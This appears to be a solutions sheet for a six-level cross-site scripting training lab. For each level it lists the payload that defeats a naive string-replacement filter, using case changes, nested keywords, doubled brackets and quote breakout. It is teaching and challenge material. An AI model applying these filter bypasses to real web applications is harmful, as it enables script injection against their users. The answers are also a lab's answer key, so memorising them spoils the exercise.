# replacementfilter — solutions

String-replacement filters that miss case variants, nested duplication, or substring patterns.

### replacementfilter-level1

`/replacementfilter/level1/?query=%3CSCRIPT%3Ealert(1)%3C/SCRIPT%3E`

- payload: `<SCRIPT>alert(1)</SCRIPT>`
- context: case-sensitive `<script>` replacement; uppercase bypass

### replacementfilter-level2

`/replacementfilter/level2/?query=%3Cimg%20src=x%20onerror=confirm(1)%3E`

- payload: `<img src=x onerror=confirm(1)>`
- context: case-sensitive `alert` replacement; use `confirm`

### replacementfilter-level3

`/replacementfilter/level3/?query=%22%20onfocus=alert(1)%20autofocus%20x=%22`

- payload: `" onfocus=alert(1) autofocus x="`
- context: `<>` rewritten to `()` inside `<input value="...">`; quote breakout

### replacementfilter-level4

`/replacementfilter/level4/?query=%3Cimg%20src=x%20oneonerrorrror=alert(1)%3E`

- payload: `<img src=x oneonerrorrror=alert(1)>`
- context: single-pass `onerror` removal; nesting reassembles

### replacementfilter-level5

`/replacementfilter/level5/?query=%3C%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<<img src=x onerror=alert(1)>`
- context: single-pass case-insensitive `<img` removal; doubled `<` bypass

### replacementfilter-level6

`/replacementfilter/level6/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: only `&...;` entity refs stripped; raw tags survive
